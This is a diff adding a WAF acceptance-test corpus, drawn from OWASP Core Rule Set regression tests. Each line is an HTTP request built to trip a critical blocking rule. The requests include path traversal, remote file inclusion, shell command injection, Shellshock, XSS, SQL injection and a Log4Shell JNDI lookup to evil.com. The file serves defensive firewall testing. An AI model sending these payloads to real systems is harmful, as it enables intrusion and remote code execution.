@@ -1,0 +1,49 @@
+# The corpus of journey WAF, gate check NET-G15 (ADR-0038 point WF7), read by
+# tests/acceptance/sovereign/internal/suite/check_waf.go. One JSON object per
+# line: test <test> of tests/regression/tests/*/<rule>.yaml of the OWASP Core
+# Rule Set v4.14.0 (github.com/coreruleset/coreruleset, tag v4.14.0). Each rule
+# is a critical rule of paranoia level 1: the request alone reaches the inbound
+# anomaly threshold, so a firewall in block mode denies it.
+{"rule":913100,"test":3,"method":"GET","target":"/get","headers":{"User-Agent":"nuclei"}}
+{"rule":930100,"test":2,"method":"GET","target":"/get?foo=.../.../WINDOWS/win.ini"}
+{"rule":930110,"test":8,"method":"GET","target":"/get?arg=..%5Cpineapple"}
+{"rule":930120,"test":5,"method":"GET","target":"/get?/sys/class=test"}
+{"rule":930130,"test":1,"method":"GET","target":"/get/sys/class"}
+{"rule":931100,"test":1,"method":"GET","target":"/get/wp-content/themes/thedawn/lib/scripts/timthumb.php?src=http://66.240.183.75/crash.php","headers":{"Referer":"http"}}
+{"rule":931110,"test":1,"method":"GET","target":"/get/plugins/spamx/BaseAdmin.class.php?_CONF[path]=https://foo.bar","headers":{"Referer":"http"}}
+{"rule":931120,"test":2,"method":"GET","target":"/get?x=ftp?"}
+{"rule":932130,"test":1,"method":"GET","target":"/get?932130-1=$(cmd)"}
+{"rule":932160,"test":12,"method":"GET","target":"/get?a=bin/chef"}
+{"rule":932170,"test":1,"method":"GET","target":"/get","headers":{"Test":"() {"}}
+{"rule":932175,"test":9,"method":"GET","target":"/get?rce=alias%20a=b"}
+{"rule":932230,"test":31,"method":"GET","target":"/get?foo=time+sh+-c+whoami"}
+{"rule":932250,"test":9,"method":"GET","target":"/get?x=ls%20foo%20bar"}
+{"rule":933120,"test":11,"method":"GET","target":"/get?code=memory_limit%20=%20512M"}
+{"rule":933130,"test":5,"method":"GET","target":"/get?%24_COOKIE=value;"}
+{"rule":933150,"test":1,"method":"GET","target":"/get/phpinfo"}
+{"rule":933160,"test":17,"method":"GET","target":"/get/substr()"}
+{"rule":933210,"test":11,"method":"GET","target":"/get?x=%28system%29%28ls%29%3B"}
+{"rule":934100,"test":10,"method":"GET","target":"/get?foo=process.env"}
+{"rule":934130,"test":4,"method":"GET","target":"/get?__proto__.test=test"}
+{"rule":934160,"test":5,"method":"GET","target":"/get?eval=while(!0);"}
+{"rule":934170,"test":3,"method":"GET","target":"/get?ssrf=data:text/plain"}
+{"rule":941110,"test":2,"method":"GET","target":"/get?x=%3Cscript+%3Ealert(1);%3C/script%3E"}
+{"rule":941140,"test":4,"method":"GET","target":"/get/bar?test=x%3Dx%3Aurl%28javascript"}
+{"rule":941160,"test":12,"method":"GET","target":"/get?foo%3Cf%20o%20r%20m=bar"}
+{"rule":941180,"test":3,"method":"GET","target":"/get/baz","headers":{"Cookie":"window.location=941180-3"}}
+{"rule":941270,"test":1,"method":"GET","target":"/get?var=%3clink%20%2f%20asdf%20href%20%20%2f%3d%20"}
+{"rule":941350,"test":1,"method":"GET","target":"/get/xx?id=%252bADw-script%252bAD4-"}
+{"rule":941390,"test":6,"method":"GET","target":"/get?arg=atob%28%29"}
+{"rule":942140,"test":1,"method":"GET","target":"/get?sql_table=pg_catalog"}
+{"rule":942160,"test":1,"method":"GET","target":"/get?sql_table=sleep%28534543%29"}
+{"rule":942170,"test":4,"method":"GET","target":"/get?test=select+if(x"}
+{"rule":942190,"test":1,"method":"GET","target":"/get?var=%20exec%20xp_cmdshell"}
+{"rule":942270,"test":2,"method":"GET","target":"/get?test=Xunionselectfrom"}
+{"rule":942280,"test":1,"method":"GET","target":"/get?var=select%20pg_sleep"}
+{"rule":942500,"test":3,"method":"GET","target":"/get?test=9999+or+%2F*%2Boptimizer+hint+*%2F+true"}
+{"rule":943100,"test":2,"method":"GET","target":"/get/foo.php?test=.cookie;expires=","headers":{"Referer":"http"}}
+{"rule":943110,"test":3,"method":"GET","target":"/get?phpsessid=asdfdasfadsads","headers":{"Referer":"https://attackersite.com/"}}
+{"rule":943120,"test":1,"method":"GET","target":"/get/login.php?jsessionid=74B0CB414BD77D17B5680A6386EF1666"}
+{"rule":944100,"test":1,"method":"POST","target":"/post","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"test=java.lang.Runtime"}
+{"rule":944130,"test":98,"method":"POST","target":"/post","headers":{"Content-Type":"application/json"},"body":"{\"test\": \"java.io.File\"}"}
+{"rule":944150,"test":2,"method":"GET","target":"/get","headers":{"User-Agent":"OWASP CRS test agent ${jndi:ldap://evil.com/webshell}"}}
